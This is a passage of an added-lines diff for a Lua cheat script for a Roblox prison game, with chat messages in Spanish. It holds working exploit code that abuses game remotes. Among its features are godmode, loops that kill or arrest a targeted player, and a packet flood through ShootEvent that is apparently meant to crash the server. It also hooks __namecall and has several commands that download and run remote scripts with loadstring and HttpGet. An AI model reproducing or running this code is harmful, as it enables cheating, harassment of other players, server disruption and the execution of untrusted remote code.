+				game.Lighting.Ambient = Color3.fromRGB(tonumber(person),tonumber(person),tonumber(person))
+			end
+
+			if action == "god" then
+				if person == "on" then
+					states.GODMODE = true
+					while states.GODMODE == true do
+						game.Players.LocalPlayer.Character.Humanoid.Name = 1
+						local l = game.Players.LocalPlayer.Character["1"]:Clone()
+						l.Parent = game.Players.LocalPlayer.Character
+						l.Name = "Humanoid"
+						wait(0.1)
+						game.Players.LocalPlayer.Character["1"]:Destroy()
+						game.Workspace.CurrentCamera.CameraSubject = game.Players.LocalPlayer.Character
+						game.Players.LocalPlayer.Character.Animate.Disabled = true
+						game.Players.LocalPlayer.Character.Animate.Disabled = true
+						game.Players.LocalPlayer.Character.Humanoid.DisplayDistanceType = "None"
+						wait(5)
+						saved = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
+						local A_1 = "\66\114\111\121\111\117\98\97\100\100"
+						local Event = game:GetService("Workspace").Remote.loadchar
+						Event:InvokeServer(A_1)
+						game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = saved
+						
+						if states.GODMODE == false then
+							break
+						end
+					end
+				else
+					if person == "off" then
+						states.GODMODE = false
+					end
+				end
+				
+			end
+
+			if action == "loopcrim" then
+				states.LOOPCRIM = true
+
+				while states.LOOPCRIM == true do
+					wait(0.02)
+
+					workspace.Remote.TeamEvent:FireServer("Bright orange")
+
+					local player = GetPlayerFromString(person) 
+
+					if player then
+						local char = workspace:FindFirstChild(player.Name)
+						local hum = char and char:FindFirstChild("HumanoidRootPart")
+						local head = char and char:FindFirstChild("Head")
+
+						local m_char = workspace:FindFirstChild(UserName)
+						local m_hum = m_char and m_char:FindFirstChild("HumanoidRootPart")
+						if m_char and m_hum and char and (char or head) then 
+							game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = hum and hum.CFrame or head.CFrame
+						end
+					end
+
+					for _,v in pairs(game.Players:GetPlayers()) do
+						pcall(function()
+							if workspace:FindFirstChild(game.Players.LocalPlayer.Name) and ((game.Players.LocalPlayer.Character:FindFirstChildOfClass('Part').Position-workspace[v.Name]:FindFirstChildOfClass('Part').Position).magnitude < 10) and v ~= game.Players.LocalPlayer then
+								for i = 1,workspace[v.Name].Humanoid.Health/5 do
+									game:GetService("ReplicatedStorage").meleeEvent:FireServer(v)
+								end
+							end
+						end)
+					end
+
+					local crim = game:GetService("Workspace")["Criminals Spawn"].SpawnLocation
+
+					local player = GetPlayerFromString(person)
+
+					crim.CanCollide = false
+					crim.CFrame = GetRootOri()
+
+					if states.LOOPCRIM == false then
+						break
+					end
+				end
+
+			end
+
+			if action == "unloopcrim" then
+				states.LOOPCRIM = false
+				wait(1)
+				local crim = game:GetService("Workspace")["Criminals Spawn"]:GetChildren()
+
+				for i,v in pairs(crim) do
+					v.CFrame = CFrame.new(778, 500, 2465)
+				end
+
+			end
+			
+			if action == "annoy" then
+				states.ANNOY = true
+
+				while states.ANNOY == true do
+					wait(0.02)
+
+					workspace.Remote.TeamEvent:FireServer("Bright orange")
+
+					local player = GetPlayerFromString(person) 
+
+					if player then
+						local char = workspace:FindFirstChild(player.Name)
+						local hum = char and char:FindFirstChild("HumanoidRootPart")
+						local head = char and char:FindFirstChild("Head")
+
+						local m_char = workspace:FindFirstChild(UserName)
+						local m_hum = m_char and m_char:FindFirstChild("HumanoidRootPart")
+						if m_char and m_hum and char and (char or head) then 
+							game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = hum and hum.CFrame or head.CFrame
+						end
+					end
+
+					for _,v in pairs(game.Players:GetPlayers()) do
+						pcall(function()
+							if workspace:FindFirstChild(game.Players.LocalPlayer.Name) and ((game.Players.LocalPlayer.Character:FindFirstChildOfClass('Part').Position-workspace[v.Name]:FindFirstChildOfClass('Part').Position).magnitude < 10) and v ~= game.Players.LocalPlayer then
+								for i = 1,workspace[v.Name].Humanoid.Health/5 do
+									game:GetService("ReplicatedStorage").meleeEvent:FireServer(v)
+								end
+							end
+						end)
+					end
+
+					if states.ANNOY == false then
+						break
+					end
+				end
+
+			end
+
+			if action == "unannoy" then
+				states.ANNOY = false
+			end
+
+			if action == "view" then
+				print("aun no")
+			end
+			if action == "count" then
+
+
+				if states.IsCounting == false then
+					script.Disabled = true
+
+					states.IsCounting = true
+
+
+
+					chat("III")
+					wait(1)
+					chat("II")
+					wait(1)
+					chat("I")
+					wait(1)
+					chat("GO")
+					wait(0.5)
+
+					states.IsCounting = false
+					script.Disabled = false
+				end
+			end
+
+			if action == "bring" then
+				local pl = GetPlayerFromString(person)
+				bring(pl)
+			end
+
+			if action == "arrest" then
+				arrest(GetPlayerFromString(person))
+			end
+
+			if action == "end" then
+				local PackageSize = 100000
+				local SendPackageAmountOfTimes = 5
+
+				local ReplicatedStorage = game:GetService("ReplicatedStorage")
+				local Players = game:GetService("Players")
+				local LocalPlayer = Players.LocalPlayer
+
+				local ItemHandler = workspace:WaitForChild("Remote").ItemHandler
+				local ShootEvent = ReplicatedStorage:WaitForChild("ShootEvent")
+
+				ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["Remington 870"].ITEMPICKUP)
+				local Tool = Players.LocalPlayer:FindFirstChild("Backpack"):FindFirstChild("Remington 870") or workspace:WaitForChild(Players.LocalPlayer.Name):FindFirstChild("Remington 870")
+
+				local Packet = {
+					RayObject = Ray.new(Vector3.new(-1, -1, -1), Vector3.new(1, 1, 1)),
+					Distance = math.huge,
+					Cframe = CFrame.new(0, 0, 0),
+					Hit = workspace:FindFirstChildOfClass("Part")
+				}
+
+				local Package = {}
+
+				for i = 1, PackageSize do
+					Package[i] = Packet
+				end
+
+				for i = 1, SendPackageAmountOfTimes do
+					ShootEvent:FireServer(Package, Tool)
+				end
+			end
+
+
+			if action == "guncolor" then
+				if person == "on" then
+					states.GUNCOLOR = true
+
+					local colorfavz = Colorf.BackgroundColor3
+
+					chatnotify("LAS ARMAS ESTARAN COLOREADAS.")
+
+					if game:GetService("Players").LocalPlayer.Backpack["Remington 870"] then
+						for i,v in pairs(game:GetService("Players").LocalPlayer.Backpack["Remington 870"].Model:GetChildren()) do
+							v.BrickColor = BrickColor.new(colorfavz)
+						end
+					else
+						print(".")
+					end
+
+					if game:GetService("Players").LocalPlayer.Backpack["AK-47"] then
+						for i,v in pairs(game:GetService("Players").LocalPlayer.Backpack["AK-47"].Model:GetChildren()) do
+							v.BrickColor = BrickColor.new(colorfavz)
+						end
+					else
+						print(".")
+					end
+
+					if game:GetService("Players").LocalPlayer.Backpack.M9 then
+						game:GetService("Players").LocalPlayer.Backpack.M9.Part.BrickColor = BrickColor.new(colorfavz)
+					else
+						print(".")
+					end
+
+					if game:GetService("Players").LocalPlayer.Backpack.M4A1 then
+						for i,v in pairs(game:GetService("Players").LocalPlayer.Backpack.M4A1.Model:GetChildren()) do
+							v.BrickColor = BrickColor.new(colorfavz)
+						end
+					else
+						print(".")
+					end
+
+
+				else
+					if person == "off" then
+						states.GUNCOLOR = false
+
+						chatnotify("LAS ARMAS YA NO ESTARAN COLOREADAS.")
+					end
+				end
+			end
+
+			if action == "gc" then
+				if person == "on" then
+					states.GUNCOLOR = true
+
+					local colorfavz = Colorf.BackgroundColor3
+
+					chatnotify("LAS ARMAS ESTARAN COLOREADAS.")
+
+					if game:GetService("Players").LocalPlayer.Backpack["Remington 870"] then
+						for i,v in pairs(game:GetService("Players").LocalPlayer.Backpack["Remington 870"].Model:GetChildren()) do
+							v.BrickColor = BrickColor.new(colorfavz)
+						end
+					else
+						print(".")
+					end
+
+					if game:GetService("Players").LocalPlayer.Backpack["AK-47"] then
+						for i,v in pairs(game:GetService("Players").LocalPlayer.Backpack["AK-47"].Model:GetChildren()) do
+							v.BrickColor = BrickColor.new(colorfavz)
+						end
+					else
+						print(".")
+					end
+
+					if game:GetService("Players").LocalPlayer.Backpack.M9 then
+						game:GetService("Players").LocalPlayer.Backpack.M9.Part.BrickColor = BrickColor.new(colorfavz)
+					else
+						print(".")
+					end
+
+					if game:GetService("Players").LocalPlayer.Backpack.M4A1 then
+						for i,v in pairs(game:GetService("Players").LocalPlayer.Backpack.M4A1.Model:GetChildren()) do
+							v.BrickColor = BrickColor.new(colorfavz)
+						end
+					else
+						print(".")
+					end
+
+
+				else
+					if person == "off" then
+						states.GUNCOLOR = false
+
+						chatnotify("LAS ARMAS YA NO ESTARAN COLOREADAS.")
+					end
+				end
+			end
+
+			if action == "cf" then
+
+				Colorf.BackgroundColor3 = Color3.fromRGB(person,person2,person3)
+
+				wait(0.1)
+				refreshColor()
+			end
+
+			if action == "loadsa" then
+				loadstring(game:HttpGet("https://raw.githubusercontent.com/Julianitocuatro/sa/main/sa",true))();
+			end
+
+			if action == "loadmold" then
+				loadstring(game:HttpGet("https://raw.githubusercontent.com/Julianitocuatro/ddasdw/main/xdxdxd",true))();
+			end
+
+			if action == "loadmnew" then
+				getgenv().Theme = 'Old'
+				loadstring(game:HttpGet("https://moscagui.000webhostapp.com/Mosca-HubV2/",true))()
+
+			end
+
+			if action == "loads" then
+				loadstring(game:HttpGet("https://raw.githubusercontent.com/Julianitocuatro/sco/main/scor", true))();
+			end
+
+			if action == "loadsb" then
+				loadstring(game:HttpGet('https://www.scorpionadm.in/script'))()
+			end
+
+			if action == "to" then
+				local player = GetPlayerFromString(person) 
+				if player then
+					local char = workspace:FindFirstChild(player.Name)
+					local hum = char and char:FindFirstChild("HumanoidRootPart")
+					local head = char and char:FindFirstChild("Head")
+
+					local m_char = workspace:FindFirstChild(UserName)
+					local m_hum = m_char and m_char:FindFirstChild("HumanoidRootPart")
+					if m_char and m_hum and char and (char or head) then 
+						game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = hum and hum.CFrame or head.CFrame
+					end
+				end
+			end
+
+			if action == "looptp" then
+				chatnotify("LOOPTP, ESCRIBE UNLOOPTP PARA DESACTIVARLO")
+				states.LoopTP = true
+				while states.LoopTP == true do
+					wait(0.01)
+					local player = GetPlayerFromString(person) 
+					if player then
+						local char = workspace:FindFirstChild(player.Name)
+						local hum = char and char:FindFirstChild("HumanoidRootPart")
+						local head = char and char:FindFirstChild("Head")
+
+						local m_char = workspace:FindFirstChild(UserName)
+						local m_hum = m_char and m_char:FindFirstChild("HumanoidRootPart")
+						if m_char and m_hum and char and (char or head) then 
+							game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = hum and hum.CFrame or head.CFrame
+						end
+					end
+
+					if states.LoopTP == false then
+						break
+					end
+				end
+			end
+
+			if action == "autoguns" then
+				if person == "on" then
+					chatnotify("AUTOGUNS AHORA ESTA ACTIVADO")
+					states.AUTOGUNS = true
+					getGuns()
+				else
+					if person == "off" then
+						states.AUTOGUNS = false
+						chatnotify("AUTOGUNS AHORA ESTA DESACTIVADO")
+					end
+				end
+			end
+
+			if action == "sa" then
+				local oof = GetPlayerFromString(person) 
+				if not oof then oof = getBoolFromString(person) end
+				if type(oof) == "boolean" and states.spam_arrest then 
+					states.spam_arrest = nil 
+				elseif typeof(oof) == "Instance" and not states.spam_arrest then 
+					local spawn_coords = CFrame.new(-920.510803, 92.2271957, 2138.27002, 0, 0, -1, 0, 1, 0, 1, 0, 0) + Vector3.new(0, 10, 0)
+					local char = workspace:FindFirstChild(UserName) 
+					local hr = char and char:FindFirstChild("HumanoidRootPart")
+					states.spam_arrest = oof.UserId 
+					if oof and char and hr then 
+						for i=1,math.huge do 
+							wait()
+							if not states.spam_arrest or SCRIPT_UNLOADED then
+								return 
+							end 
+							hr.CFrame = spawn_coords
+							bring(oof)
+							arrest(oof, 20)
+						end  
+					end
+				end 
+			end
+
+			if action == "unlooptp" then
+				states.LoopTP = false
+				chatnotify("LOOPTP DESACTIVADO.")
+			end
+
+			if action == "hitmarker" then
+				chatnotify("SE HA ACTIVADO EL HITMARKER (INDICADOR DE DAÑO)")
+				local IAPortable = Instance.new("ScreenGui")
+				local Cursor = Instance.new("ImageLabel")
+				local Hitmarker = Instance.new("ImageLabel")
+
+				IAPortable.Name = "IA Portable"
+				IAPortable.Parent = game:GetService('CoreGui')
+				IAPortable.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+
+				Cursor.Name = "Cursor"
+				Cursor.Parent = IAPortable
+				Cursor.AnchorPoint = Vector2.new(0.5, 0.5)
+				Cursor.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+				Cursor.BackgroundTransparency = 1.000
+				Cursor.Size = UDim2.new(0, 256, 0, 256)
+				Cursor.Image = "rbxassetid://3355815697"
+				Cursor.ScaleType = Enum.ScaleType.Fit
+
+				Hitmarker.Name = "Hitmarker"
+				Hitmarker.AnchorPoint = Vector2.new(0.5, 0.5)
+				Hitmarker.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+				Hitmarker.BackgroundTransparency = 1.000
+				Hitmarker.BorderColor3 = Color3.fromRGB(27, 42, 53)
+				Hitmarker.Position = UDim2.new(0.5, 0, 0.5, 0)
+				Hitmarker.Size = UDim2.new(0, 45, 0, 45)
+				Hitmarker.Image = "rbxassetid://890801299"
+
+				local SoundService = game:GetService("SoundService")
+				local ReplicatedStorage = game:GetService('ReplicatedStorage')
+				local UserInputService = game:GetService('UserInputService')
+				local RunService = game:GetService('RunService')
+				local Players = game:GetService('Players')
+
+				local Remotes = ReplicatedStorage:FindFirstChild('Remotes') or ReplicatedStorage
+				local ShootEvent = Remotes.ShootEvent
+				local LocalPlayer = Players.LocalPlayer
+				local Mouse = LocalPlayer:GetMouse()
+
+				local function createSoundEffect(id, volume)
+					coroutine.wrap(function()
+						local sound = Instance.new("Sound")
+						sound.SoundId = id
+						sound.Volume = volume or 1
+						SoundService:PlayLocalSound(sound)
+						sound.Ended:Wait()
+						sound:Destroy()
+					end)()
+				end
+
+				local Bindable = Instance.new('BindableEvent')
+
+				Bindable.Event:Connect(function(bullets, gun)
+					local ShotHit = false
+
+					for _,bullet in pairs(bullets) do
+						local Hit = bullet.Hit
+
+						local Limb = Hit.Parent:FindFirstChildOfClass('Humanoid') ~= nil
+						local Accessory = Hit.Parent.Parent:FindFirstChildOfClass('Humanoid') ~= nil
+
+						if Limb then
+							local Player = Players:GetPlayerFromCharacter(Hit.Parent)
+
+							if Player.TeamColor ~= LocalPlayer.TeamColor then
+								ShotHit = true
+								break
+							end
+						elseif Accessory then
+							local Player = Players:GetPlayerFromCharacter(Hit.Parent.Parent)
+
+							if Player.TeamColor ~= LocalPlayer.TeamColor then
+								ShotHit = true
+								break
+							end
+						end
+					end
+
+					if ShotHit then
+						createSoundEffect("rbxassetid://1347140027", 1)
+
+						local Clone = Hitmarker:Clone()
+						Clone.Position = UDim2.new(0,Mouse.X,0,Mouse.Y)
+						Clone.Parent = IAPortable
+						Clone.Rotation = math.random(0,90)
+
+						game:GetService('Debris'):AddItem(Clone, 0.05)
+					end
+				end)
+
+				local OldNameCall
+				OldNameCall = hookmetamethod(game, '__namecall', function(self, ...)
+					local method = getnamecallmethod()
+					local args = {...}
+
+					if method == 'FireServer' and self == ShootEvent then
+						Bindable.Fire(Bindable, unpack(args))
+					end
+
+					return OldNameCall(self, ...)
+				end)
+
+				RunService.RenderStepped:Connect(function()
+					UserInputService.MouseIconEnabled = false
+
+					Cursor.Position = UDim2.new(0,Mouse.X,0,Mouse.Y)
+
+					local Target = Mouse.Target
+					local Limb = Target.Parent:FindFirstChildOfClass('Humanoid')
+					local Accessory = Target.Parent.Parent:FindFirstChildOfClass('Humanoid')
+
+					if Limb then
+						local Player = Players:GetPlayerFromCharacter(Target.Parent)
+						if Player.TeamColor == LocalPlayer.TeamColor then
+							Cursor.ImageColor3 = Color3.fromRGB(0,255,0)
+						else
+							Cursor.ImageColor3 = Color3.fromRGB(255,0,0)
+						end
+					elseif Accessory then
+						local Player = Players:GetPlayerFromCharacter(Target.Parent.Parent)
+						if Player.TeamColor == LocalPlayer.TeamColor then
+							Cursor.ImageColor3 = Color3.fromRGB(0,255,0)
+						else
+							Cursor.ImageColor3 = Color3.fromRGB(255,0,0)
+						end
+					else
+						Cursor.ImageColor3 = Color3.fromRGB(255,255,255)
+					end
+				end)
+			end
+
+			if action == "oldguns" then
+				if person == "on" then
+					states.OLDGUNS = true
+
+					if game:GetService("Players").LocalPlayer.Backpack["AK-47"].Handle then
+						game:GetService("Players").LocalPlayer.Backpack["AK-47"].Handle.FireSound.SoundId = "rbxassetid://153230498"
+
+						game:GetService("Players").LocalPlayer.Backpack["AK-47"].Handle.ReloadSound.SoundId = "rbxassetid://142491708"
+					end
+
+					if game:GetService("Players").LocalPlayer.Backpack.M9.Handle then
+						game:GetService("Players").LocalPlayer.Backpack.M9.Handle.FireSound.SoundId = "rbxassetid://134436500"
+
+						game:GetService("Players").LocalPlayer.Backpack.M9.Handle.ReloadSound.SoundId = "rbxassetid://142491708"
+					end
+
+					if game:GetService("Players").LocalPlayer.Backpack["Remington 870"] then
+						game:GetService("Players").LocalPlayer.Backpack["Remington 870"].Handle.FireSound.SoundId = "rbxassetid://138083993"
+
+						game:GetService("Players").LocalPlayer.Backpack["Remington 870"].Handle.ReloadSound.SoundId = "rbxassetid://145081845"
+					end
+
+					if game:GetService("Players").LocalPlayer.Backpack.M4A1 then
+						game:GetService("Players").LocalPlayer.Backpack.M4A1.Handle.FireSound.SoundId = "rbxassetid://282003150"
+
+						game:GetService("Players").LocalPlayer.Backpack.M4A1.Handle.ReloadSound.SoundId = "rbxassetid://142491708"
+					end
+
+					chatnotify("TUS ARMAS AHORA SON ANTIGUAS")
+
+				end
+
+				if person == "off" then
+					states.OLDGUNS = false
+
+					chatnotify("TUS ARMAS AHORA SON NUEVAS")
+				end
+			end
+
+			if action == "silenceguns" then
+				if person == "on" then
+					states.SILENCEGUNS = true
+
+					if game:GetService("Players").LocalPlayer.Backpack["AK-47"].Handle then
+						game:GetService("Players").LocalPlayer.Backpack["AK-47"].Handle.FireSound.SoundId = 0
+
+						game:GetService("Players").LocalPlayer.Backpack["AK-47"].Handle.ReloadSound.SoundId = 0
+					end
+
+					if game:GetService("Players").LocalPlayer.Backpack.M9.Handle then
+						game:GetService("Players").LocalPlayer.Backpack.M9.Handle.FireSound.SoundId = 0
+
+						game:GetService("Players").LocalPlayer.Backpack.M9.Handle.ReloadSound.SoundId = 0
+					end
+
+					if game:GetService("Players").LocalPlayer.Backpack["Remington 870"] then
+						game:GetService("Players").LocalPlayer.Backpack["Remington 870"].Handle.FireSound.SoundId = 0
+
+						game:GetService("Players").LocalPlayer.Backpack["Remington 870"].Handle.ReloadSound.SoundId = 0
+					end
+
+					if game:GetService("Players").LocalPlayer.Backpack.M4A1 then
+						game:GetService("Players").LocalPlayer.Backpack.M4A1.Handle.FireSound.SoundId = 0
+
+						game:GetService("Players").LocalPlayer.Backpack.M4A1.Handle.ReloadSound.SoundId = 0
+					end
+
+					chatnotify("TUS ARMAS AHORA ESTAN SILENCIADAS")
+
+				end
+
+				if person == "off" then
+					states.SILENCEGUNS = false
+
+					chatnotify("TUS ARMAS YA NO ESTAN SILENCIADAS")
+				end
+			end
+
+			if action == "autolock" then
+				if person == "on" then
+					chatnotify("AUTOLOCK AHORA ESTA ACTIVADO")
+					states.AUTOLOCK = true
+
+					game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 24
+					game.Players.LocalPlayer.Character.ClientInputHandler.Disabled = true
+					game.Players.LocalPlayer.CharacterAdded:connect(function()
+						game.Workspace:WaitForChild(game.Players.LocalPlayer.Name)
+						game.Players.LocalPlayer.Character.ClientInputHandler.Disabled = true
+					end)
+
+				else
+					if person == "off" then
+						states.AUTOLOCK = false
+						chatnotify("AUTOLOCK AHORA ESTA DESACTIVADO")
+
+						respawns()
+						wait()
+						getGuns()
+					end
+				end
+			end
+
+			if action == "autol" then
+				if person == "on" then
+					chatnotify("AUTOLOCK AHORA ESTA ACTIVADO")
+					states.AUTOLOCK = true
+
+					game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 24
+					game.Players.LocalPlayer.Character.ClientInputHandler.Disabled = true
+					game.Players.LocalPlayer.CharacterAdded:connect(function()
+						game.Workspace:WaitForChild(game.Players.LocalPlayer.Name)
+						game.Players.LocalPlayer.Character.ClientInputHandler.Disabled = true
+					end)
+
+				else
+					if person == "off" then
+						states.AUTOLOCK = false
+						chatnotify("AUTOLOCK AHORA ESTA DESACTIVADO")
+
+						respawns()
+						wait()
+						getGuns()
+					end
+				end
+			end
+
+			if action == "pvp" then
+				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-770, 11, 1491)
+				chatnotify("TELETRANSPORTADO A ZONA PVP")
+			end
+
+			if action == "base" then
+				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-943, 95, 2056)
+				chatnotify("TELETRANSPORTADO A BASE")
+			end
+
+			if action == "cells" then
+				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(917, 100, 2415)
+				chatnotify("TELETRANSPORTADO A CELLS")
+			end
+
+			if action == "yard" then
+				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(778, 98, 2465)
+				chatnotify("TELETRANSPORTADO A YARD")
+			end
+
+			if action == "roof" then
+				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(848,118,2332)
+				chatnotify("TELETRANSPORTADO A ROOF")
+			end
+
+			if action == "cafe" then
+				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(879, 99, 2247)
+				chatnotify("TELETRANSPORTADO A CAFE")
+			end
+
+			if action == "nex" then
+				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(917, 100, 2387)
+				chatnotify("TELETRANSPORTADO A NEXUS")
+			end
+
+			if action == "armory" then
+				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(798,99,2260)
+				chatnotify("TELETRANSPORTADO A ARMERIA")
+			end
+
+			if action == "back" then
+				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(980, 101, 2327)
+				chatnotify("TELETRANSPORTADO A ATRAS")
+			end
+
+			if action == "antilag" then
+				game:GetService("Lighting").Brightness = 0.6
+				game:GetService("Lighting").ClockTime = 14
+				game:GetService("Lighting").FogEnd = 100000
+				game:GetService("Lighting").GlobalShadows = false
+				game:GetService("Lighting").OutdoorAmbient = Color3.fromRGB(128, 128, 128)
+				for _, v in pairs(game:GetDescendants()) do
+					pcall(function()
+						v.Material = Enum.Material.SmoothPlastic
+					end)
+				end
+				chatnotify("SE HA ACTIVADO EL ANTILAG")
+			end
+
+			if action == "coploop" then
+				chatnotify("COPLOOP AHORA ESTA ACTIVADO")
+				if person == "on" then
+
+					states.COPLOOP = true
+
+					while true do
+						wait(.01)
+						workspace.Remote.TeamEvent:FireServer("Bright blue")
+
+						if states.COPLOOP == false then
+							break
+						end
+					end
+
+				else
+
+					if person == "off" then
+						states.COPLOOP = false
+						chatnotify("COPLOOP AHORA ESTA DESACTIVADO")
+					end
+				end
+			end
+			
+			if action == "ff" then
+
+				refreshT(Color3.fromRGB(255, 0, 0))
+				
+				workspace.Remote.TeamEvent:FireServer("Bright orange")
+			end
+			
+			if action == "loopff" then
+				
+				if person == "on" then
+					states.LoopFF = true
+					while states.LoopFF == true do
+						refreshT(Color3.fromRGB(255, 0, 0))
+
+						workspace.Remote.TeamEvent:FireServer("Medium stone grey")
+						wait(9)
+						if states.LoopFF == false then
+							break
+						end
+					end
+				else
+					if person == "off" then
+						states.LoopFF = false
+					end
+				end
+			end
+			
+			
+			
+			if action == "cl" then
+				if person == "on" then
+					chatnotify("COPLOOP AHORA ESTA ACTIVADO")
+
+					states.COPLOOP = true
+
+					while true do
+						wait(.01)
+						workspace.Remote.TeamEvent:FireServer("Bright blue")
+						if states.COPLOOP == false then
+							break
+						end
+					end
+				else
+					if person == "off" then
+						states.COPLOOP = false
+						chatnotify("COPLOOP AHORA ESTA DESACTIVADO")
+					end
+				end
+			end
+
+			if action == "antispam" then
+				if person == "on" then
+					chatnotify("El ANTISPAM HA SIDO ACTIVADO")
+					states.ANTISPAM = true
+
+					refreshT(0, 0, 0)
+
+					if states.AUTORE == true then
+						local char = workspace:FindFirstChild(UserName)
+
+						char.Humanoid.Died:Connect(humanoidDied)
+					end
+
+					local crim = game:GetService("Workspace")["Criminals Spawn"]:GetChildren()
+
+					for i,v in pairs(crim) do
+						v.CFrame = CFrame.new(778, 500, 2465)
+					end
+
+					while true do
+						wait(.001)
+
+						local crims = GetPlayersInTeam("Criminals")
+
+						for i, v in pairs(crims) do
+							if v == game:GetService("Players").LocalPlayer then
+								refreshT(Colorf.BackgroundColor3)
+
+								if states.AUTORE == true then
+									local char = workspace:FindFirstChild(UserName)
+
+									char.Humanoid.Died:Connect(humanoidDied)
+								end
+							end
+						end
+
+						local pris = GetPlayersInTeam("Inmates")
+
+						refreshT(0, 0, 0)
+
+						if states.ANTISPAM == false then
+							break
+						end
+					end
+				else
+					if person == "off" then
+						chatnotify("EL ANTISPAM HA SIDO DESACTIVADO")
+						states.ANTISPAM = false
+					end
+				end
+			end
+
+			if action == "autorespawn" then
+				if person == "on" then
+					chatnotify("EL AUTORESPAWN HA SIDO ACTIVADO.")
+					states.AUTORE = true
+
+					healthBar()
+					local char = workspace:FindFirstChild(UserName)
+
+					char.Humanoid.Died:Connect(humanoidDied)
+				else
+					if person == "off" then
+						states.AUTORE = false
+						chatnotify("EL AUTORESPAWN HA SIDO DESACTIVADO.")
+
+						healthBar()
+						respawns()
+					end
+				end
+			end
+			
+			if action == "anticrim" then
+				if person == "on" then
+					states.ANTICRIM = true
+					while true do
+						wait()
+						local crimis = GetPlayersInTeam("Criminals")
+						
+						for i, v in pairs(crimis) do
+							if v == game:GetService("Players").LocalPlayer then
+								NoCrims(Color3.fromRGB(0, 0, 0))
+
+								if states.AUTORE == true then
+									local char = workspace:FindFirstChild(UserName)
+
+									char.Humanoid.Died:Connect(humanoidDied)
+								end
+							end
+						end
+						
+						if states.ANTICRIM == false then
+							break
+						end
+					end
+				else
+					if person == "off" then
+						states.ANTICRIM = false
+					end
+				end
+			end
+			if action == "auto" then
+				if person == "on" then
+					chatnotify("EL AUTORESPAWN HA SIDO ACTIVADO.")
+					states.AUTORE = true
+
+					healthBar()
+					local char = workspace:FindFirstChild(UserName)
+
+					char.Humanoid.Died:Connect(humanoidDied)
+				else
+					if person == "off" then
+						states.AUTORE = false
+						chatnotify("EL AUTORESPAWN HA SIDO DESACTIVADO.")
+
+						healthBar()
+						respawns()
+					end
+				end
+			end
+
+
+			if action == "autore" then
+				if person == "on" then
+					chatnotify("EL AUTORESPAWN HA SIDO ACTIVADO.")
+					states.AUTORE = true
+
+					healthBar()
+					local char = workspace:FindFirstChild(UserName)
+
+					char.Humanoid.Died:Connect(humanoidDied)
+				else
+					if person == "off" then
+						states.AUTORE = false
+						chatnotify("EL AUTORESPAWN HA SIDO DESACTIVADO.")
+
+						healthBar()
+						respawns()
+					end
+				end
+			end
+
+			if action == "t" then
+				if person == "g" then
+					workspace.Remote.TeamEvent:FireServer("Bright blue")
+
+					if states.AUTORE == true then
+						local char = workspace:FindFirstChild(UserName)
+
+						char.Humanoid.Died:Connect(humanoidDied)
+						healthBar()
+					end
+				else 
+					if person == "i" then
+						workspace.Remote.TeamEvent:FireServer("Bright orange")
+
+						if states.AUTORE == true then
+							local char = workspace:FindFirstChild(UserName)
+
+							char.Humanoid.Died:Connect(humanoidDied)
+							healthBar()
+						end
+					else
+						if person == "n" then
+							workspace.Remote.TeamEvent:FireServer("Medium stone grey")
+
+							if states.AUTORE == true then
+								local char = workspace:FindFirstChild(UserName)
+
+								char.Humanoid.Died:Connect(humanoidDied)
+								healthBar()
+							end
+						else 
+							if person == "c" then
+								local lastPos = game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart").position
+								LCS = game.Workspace["Criminals Spawn"].SpawnLocation
+								LCS.CanCollide = false
+								LCS.Size = Vector3.new(51.05, 24.12, 54.76)
+								LCS.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
+								LCS.Transparency = 1
+								wait(0.5)
+								LCS.CFrame = CFrame.new(-920.510803, 92.2271957, 2138.27002, 0, 0, -1, 0, 1, 0, 1, 0, 0)
+								LCS.Size = Vector3.new(6, 0.2, 6)
+								LCS.Transparency = 0
+								wait()
+								game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(lastPos)
+								healthBar()
+
+								if states.AUTORE == true then
+									local char = workspace:FindFirstChild(UserName)
+
+									char.Humanoid.Died:Connect(humanoidDied)
+								end
+
+							else
+								if person and person2 and person3 then
+									refreshT(Color3.fromRGB(person,person2,person3))
+
+
+									healthBar()
+
+									if states.AUTORE == true then
+										local char = workspace:FindFirstChild(UserName)
+
+										char.Humanoid.Died:Connect(humanoidDied)
+									end
+								else
+									if person == "color" then
+										refreshT(Colorf.BackgroundColor3)
+
+										healthBar()
+
+										if states.AUTORE == true then
+											local char = workspace:FindFirstChild(UserName)
+
+											char.Humanoid.Died:Connect(humanoidDied)
+										end
+									end
+								end
+							end
+						end
+					end
+				end
+			end
+
+			if action == "team" then
+				if person == "g" then
+					workspace.Remote.TeamEvent:FireServer("Bright blue")
+
+					if states.AUTORE == true then
+						local char = workspace:FindFirstChild(UserName)
+
+						char.Humanoid.Died:Connect(humanoidDied)
+						healthBar()
+					end
+				else 
+					if person == "i" then
+						workspace.Remote.TeamEvent:FireServer("Bright orange")
+
+						if states.AUTORE == true then
+							local char = workspace:FindFirstChild(UserName)
+
+							char.Humanoid.Died:Connect(humanoidDied)
+							healthBar()
+						end
+					else
+						if person == "n" then
+							workspace.Remote.TeamEvent:FireServer("Medium stone grey")
+
+							if states.AUTORE == true then
+								local char = workspace:FindFirstChild(UserName)
+
+								char.Humanoid.Died:Connect(humanoidDied)
